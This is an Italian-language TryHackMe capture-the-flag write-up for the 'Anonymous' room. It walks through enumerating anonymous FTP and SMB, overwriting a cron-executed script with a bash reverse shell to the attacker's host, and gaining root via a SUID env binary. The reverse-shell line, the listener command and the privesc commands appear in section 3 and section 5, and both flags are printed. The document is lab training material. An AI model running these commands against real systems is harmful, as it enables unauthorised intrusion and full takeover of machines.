---
tags:
  - ctf
  - tryhackme
  - medium
  - linux
  - ftp
  - smb
  - cron-abuse
  - suid-env
  - privesc
room: Anonymous
platform: TryHackMe
difficulty: Medium
data: 2026-09-14
---

# Anonymous — TryHackMe Writeup

**Target IP:** `10.130.136.84` (poi rideployata su `10.113.137.2` durante l'exploitation)

## 1. Reconnaissance

Scansione iniziale delle porte con nmap:

```bash
nmap -sS -sVC -Pn 10.130.136.84
```

![[Screenshot From 2026-09-14 15-27-46.png]]

**Risultato:**

| Porta | Servizio | Versione |
|-------|----------|----------|
| 21 | FTP | vsftpd 2.0.8 or later — **login anonimo abilitato** |
| 22 | SSH | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 |
| 139/445 | SMB | Samba smbd 3.X - 4.X / 4.7.6-Ubuntu |

Banner FTP: **"NamelessOne's FTP Server"**

Info aggiuntive da script SMB (`smb-os-discovery`): OS Linux, hostname `anonymous`, workgroup `WORKGROUP`.

## 2. Enumerazione

### 2.1 FTP anonimo

Login anonimo consentito (`ftp-anon: Anonymous FTP login allowed`), con una directory `scripts` scrivibile (`[NSE: writeable]`):

```bash
ftp 10.130.136.84
```

![[Screenshot From 2026-09-14 15-36-25.png]]

Nella directory `scripts` sono presenti tre file, scaricati in locale:

| File | Dimensione | Note |
|------|-----------|------|
| `clean.sh` | 314 byte | `-rwxr-xr--`, eseguibile — probabile script di pulizia lanciato periodicamente |
| `removed_files.log` | 989 byte | Log aggiornato di recente (`Sep 14 13:29`) → segnale che `clean.sh` viene eseguito da un cron job attivo |
| `to_do.txt` | 68 byte | Nota testuale |

Il timestamp recente di `removed_files.log` conferma che lo script viene rieseguito periodicamente: se è scrivibile via FTP, può essere sostituito con una reverse shell.

### 2.2 Enumerazione SMB

Elenco delle share disponibili:

```bash
smbclient -L //10.130.136.84 -N
```

![[Screenshot From 2026-09-14 15-39-14.png]]

**Share trovate:**

| Share | Tipo | Commento |
|-------|------|----------|
| `print$` | Disk | Printer Drivers |
| `pics` | Disk | My SMB Share Directory for Pics |
| `IPC$` | IPC | IPC Service (accesso anonimo, Samba, Ubuntu) |

Accesso anonimo alla share `pics`:

```bash
smbclient //10.130.136.84/pics -N
```

![[Screenshot From 2026-09-14 15-42-35.png]]

Scaricati `corgo2.jpg` (42663 byte) e `puppos.jpeg` (265188 byte) — nessuna informazione utile trovata al loro interno (probabile red herring/steganografia da escludere, non sfruttata in questo path).

## 3. Exploitation — Abuso di script FTP eseguito da cron

### 3.1 Modifica di `clean.sh`

Poiché `scripts/` è scrivibile via FTP anonimo e `clean.sh` viene rieseguito periodicamente (come dimostrato dal log), lo script viene modificato aggiungendo una reverse shell:

![[Screenshot From 2026-09-14 16-19-34.png]]

```bash
#!/bin/bash
bash -i >& /dev/tcp/192.168.132.9/9999 0>&1
```

(`192.168.132.9` = IP della VPN `tun0` della macchina d'attacco, verificato con `ip a`)

### 3.2 Upload del payload e listener

Listener in ascolto sulla macchina d'attacco:

```bash
nc -lvnp 9999
```

Upload dello script modificato via FTP nella directory `scripts`, con alcuni tentativi (uno fallito per path errato `/dev/tcp/`, poi corretto):

```bash
ftp> cd scripts
ftp> put clean.sh
```

![[Screenshot From 2026-09-14 16-28-26.png]]

Dopo l'upload, `less clean.sh` sul server conferma il contenuto malevolo caricato correttamente.

### 3.3 Ottenimento della reverse shell

Alla successiva esecuzione automatica dello script (cron job) sul target, la connessione viene ricevuta sul listener:

```
connect to [192.168.132.9] from (UNKNOWN) [10.113.137.2] 59394
bash: cannot set terminal process group (1526): Inappropriate ioctl for device
bash: no job control in this shell
namelessone@anonymous:~$
```

![[Screenshot From 2026-09-14 16-33-41.png]]

Shell ottenuta come utente **namelessone**.

## 4. User Flag

```bash
ls
cat user.txt
```

**User flag:**
```
90d6f992585815ff991e68748c414740
```

Verifica dei privilegi correnti:

```bash
sudo -l
```
```
sudo: no tty present and no askpass program specified
```

```bash
id
```
```
uid=1000(namelessone) gid=1000(namelessone) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

L'utente appartiene al gruppo `sudo`, ma senza una tty allocata `sudo -l` non fornisce output utile — necessario cercare un altro vettore di privesc.

## 5. Privilege Escalation

### 5.1 Ricerca binari SUID

```bash
find /usr/bin -perm -u=s -type f 2>/dev/null
```

![[Screenshot From 2026-09-14 16-45-57.png]]

```
/usr/bin/passwd
/usr/bin/env
/usr/bin/gpasswd
/usr/bin/newuidmap
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/traceroute6.iputils
/usr/bin/at
/usr/bin/pkexec
```

Tra i binari SUID standard di sistema, uno risulta anomalo:

```
/usr/bin/env
```

**Perché è "debole":** `env` con il bit SUID attivo non è una configurazione di default. Permette di lanciare qualsiasi comando mantenendo i permessi del proprietario del binario (root) — vettore di privesc documentato su [GTFOBins](https://gtfobins.github.io/).

### 5.2 Exploitation del SUID env

```bash
/usr/bin/env /bin/sh -p
```

![[Screenshot From 2026-09-14 16-47-43.png]]

Il flag `-p` mantiene i privilegi effettivi (evita che `sh` li rilasci automaticamente, come già osservato con `dash` nel caso analogo di RootMe).

Primo tentativo di navigazione fallito per errore di path (case-sensitive, manca lo slash iniziale):

```bash
cd root
```
```
/bin/sh: 1: cd: can't cd to root
```

## 6. Root Flag

Corretto il path:

```bash
whoami
cd /root
ls
cat root.txt
```

![[Screenshot From 2026-09-14 16-48-12.png]]

```
whoami
root
```

**Root flag:**
```
4d930091c31a622a7ed10f27999af363
```

Privilege escalation a **root** riuscita.

## 7. Riepilogo tecniche usate

- Enumerazione porte/servizi: `nmap`
- Enumerazione FTP anonimo: accesso a directory scrivibile `scripts/`
- Enumerazione SMB anonima: `smbclient -L` / `smbclient //target/pics -N`
- Identificazione di uno script (`clean.sh`) rieseguito periodicamente da cron, individuata grazie al log `removed_files.log` aggiornato di recente
- Exploitation: sovrascrittura via FTP dello script con una reverse shell bash, in attesa dell'esecuzione automatica lato server
- Privilege escalation: binario SUID non standard `/usr/bin/env` → `env /bin/sh -p` per una shell root

## 8. Lezioni apprese

- Un servizio FTP con **login anonimo e directory scrivibili** è un vettore critico quando quei file vengono consumati da processi automatizzati (cron, script di manutenzione): basta un file di log con timestamp recente per dedurre l'esistenza di un job periodico.
- Le share **SMB accessibili anonimamente** vanno sempre enumerate, anche quando (come in questo caso) non portano a un vettore diretto: aiutano comunque a mappare la superficie d'attacco.
- `sudo -l` senza tty allocata può dare un falso negativo ("no tty present") — non significa assenza di privilegi sudo, va verificato con `id` o allocando una pty (`python -c 'import pty; pty.spawn("/bin/bash")'`) prima di scartare quella via.
- Un binario SUID "anomalo" si riconosce confrontandolo con la lista standard di file SUID attesi (`passwd`, `sudo`, `su`, `mount`, `pkexec`, ecc.): qualsiasi tool general-purpose come `env` con quel bit è quasi sempre un vettore di privesc immediato via GTFOBins.
